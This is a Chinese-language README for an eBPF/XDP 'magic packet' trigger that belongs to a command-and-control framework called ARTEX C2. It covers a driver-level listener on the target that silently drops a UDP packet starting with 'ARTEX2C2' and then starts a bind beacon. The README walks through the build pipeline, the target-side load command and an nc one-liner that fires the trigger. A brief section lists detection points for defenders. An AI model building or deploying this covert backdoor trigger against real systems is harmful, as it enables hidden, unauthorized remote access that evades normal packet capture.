# ARTEX C2 eBPF 触发器(tc/XDP 魔法包)

契约 C2_CONTRACTS.md §19「载荷矩阵」stretch 项(Agent P)。目标机预置一个
XDP/tc 层的魔法包监视器;操作员向 `udp/<TRIGGER_PORT>` 发一个载荷前 8 字节
匹配的 UDP 报文,触发器在驱动层静默丢弃该报文(不留协议栈痕迹)并在 BPF map
记录命中时间戳;用户态轮询脚本发现新命中即拉起配套的 bind beacon(载荷矩阵
artifact=ebpf 构建产物内的 `beacon_bind` 二进制)。

## 组成

| 文件 | 说明 |
|---|---|
| `xdp_trigger.c` | XDP 程序(可经 tc clsact ingress 等价加载):解析 eth/ip/udp,匹配目的端口 + 8 字节魔法 → map 记时 + XDP_DROP |
| `load_trigger.sh` | clang -target bpf 编译 → `ip link xdp obj` 挂载(失败回退 tc)→ bpftool 轮询 map → 拉起 beacon |
| `README.md` | 本文档 |

魔法字节默认序列:`41 52 54 45 58 32 43 32`("ARTEX2C2" ASCII),端口默认
47771;两者都在编译期以 `-D` 宏注入,可按监听器区分。

## VPS 构建管线(server/c2_build.go,artifact=ebpf)

1. 平台把本目录源码(c2center.EbpfTriggerAssets)+ bind beacon 源码(main.go)
   上传工作区;
2. `command -v clang` 探测——缺失则作业 error,提示先安装 clang
   (`apt install clang`,另需 `linux-libc-dev` 提供 /usr/include/linux/bpf.h);
3. `clang -O2 -g -target bpf -DTRIGGER_PORT=<port> -c xdp_trigger.c -o trigger.o`;
4. `go build -o beacon_bind main.go`(bind beacon,方向 bind);
5. 产物(trigger.o + beacon_bind + load_trigger.sh + 本 README)打包 zip 回填载荷行。

## 目标机使用

```sh
./load_trigger.sh eth0 ./beacon_bind 47771
# 另一端:操作员向目标 udp/47771 发送首 8 字节为 ARTEX2C2 的 UDP 报文
# (如:printf 'ARTEX2C2' | nc -u -w1 <target> 47771)
```

## 教育要点(防御视角)

- XDP 程序运行在驱动层,先于内核协议栈,魔法包被 XDP_DROP 后 tcpdump/conntrack
  都不可见——蓝队需要在 NIC/交换机层或通过 `ip link`/`bpftool prog show` 的
  挂载巡检发现;
- `bpftool map show`/`ip link show` 中出现的 trigger_map/xdp 钩子是本触发器
  最直接的检测面;生产环境的 eBPF 滥用检测(如 bpf 审计、lockdown)同样适用;
- 本实现刻意不混淆、不持久化、不写内核日志以外的任何状态,仅用于演示
  「eBPF 作为 C2 触发面」的攻防语义。

## 限制(如实)

- 仅 linux;x86_64 实测路径,ARM64 需同样 clang -target bpf(理论上通用);
- 用户态轮询为 1s 粒度的 bpftool map dump,不是事件驱动(无 libbpf 依赖的代价);
- `ip link xdp obj` 需要 iproute2 较新版本;老系统走 tc clsact 回退路径。
